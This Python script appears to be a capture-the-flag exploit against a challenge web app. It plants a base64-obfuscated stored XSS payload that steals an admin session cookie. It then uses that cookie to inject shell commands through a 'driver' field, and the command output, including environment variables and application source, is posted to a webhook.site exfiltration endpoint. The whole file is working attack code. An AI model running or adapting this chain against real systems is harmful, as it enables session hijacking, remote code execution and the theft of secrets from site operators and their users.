#!/usr/bin/env python3
"""Quick exfil helper - reuses admin cookie"""
import requests, time, re, base64, sys

BASE = "https://hackon-mega-posts.chals.io"
WEBHOOK = "https://webhook.site/<YOUR-UUID>"

# Get admin cookie
s = requests.Session()
user = f"ex{int(time.time())}"[-8:]
s.post(f"{BASE}/register", data={"username": user, "email": f"{user}@t.com", "password": "p"}, timeout=15)
s.post(f"{BASE}/login", data={"username": user, "password": "p"}, timeout=15)
r = s.get(f"{BASE}/dashboard", timeout=15)
uid = re.search(r"/profile\?uid=(\d+)", r.text).group(1)

js = f"fetch('/post',{{method:'POST',body:new URLSearchParams({{content:'CK:'+document.cookie}})}})"
b64 = base64.b64encode(js.encode()).decode()
xss = f"<img src=x onerror=\"eval(atob('{b64}'))\">"
s.post(f"{BASE}/profile?uid={uid}", data={"bio": xss}, timeout=15)
try:
    s.post(f"{BASE}/visit", timeout=60)
except:
    pass
time.sleep(5)
r = s.get(f"{BASE}/dashboard", timeout=15)
cookies = re.findall(r"CK:(session=[^<]+)", r.text)
admin_cookie = cookies[0].split("=", 1)[1]
print(f"[+] Cookie: {admin_cookie[:30]}...")

admin = requests.Session()
admin.cookies.set("session", admin_cookie, domain="hackon-mega-posts.chals.io")

cmds = (
    sys.argv[1:]
    if len(sys.argv) > 1
    else ["ls /app", "cat /app/entrypoint.sh", "cat /entrypoint.sh", "env", "cat /app/app.py"]
)

for cmd in cmds:
    payload = f"; python3 -c \"import requests,os; requests.post('{WEBHOOK}', data=os.popen('{cmd}').read())\""
    print(f"[>] {cmd}")
    admin.post(f"{BASE}/diagnosis", data={"driver": payload}, timeout=30, allow_redirects=False)
    time.sleep(4)

print(f"\n[*] Check: https://webhook.site/#!/view/<YOUR-UUID>")
time.sleep(5)

r = requests.get(f"https://webhook.site/token/<YOUR-UUID>/requests?sorting=newest&per_page=10", timeout=15)
for req in r.json().get("data", []):
    content = req.get("content", "") or req.get("text_content", "") or ""
    if content:
        print(f"---\n{content[:800]}")
